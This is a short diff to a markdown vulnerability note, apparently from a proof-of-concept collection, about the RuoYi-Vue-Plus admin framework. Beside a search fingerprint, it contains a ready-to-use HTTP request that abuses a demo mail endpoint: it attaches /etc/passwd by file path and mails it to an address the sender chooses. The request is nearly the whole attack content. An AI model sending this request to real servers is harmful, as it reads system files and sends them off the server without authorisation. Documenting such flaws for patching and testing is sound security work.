@@ -8,7 +8,7 @@
 body="RuoYi-Vue-Plus后台管理框架"
 ```
 
-## poc
+## POC
 ```
 GET /demo/mail/sendMessageWithAttachment?to=xxx@xxx.com&passwd=xxxxxx&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
 Host: [已模糊处理]
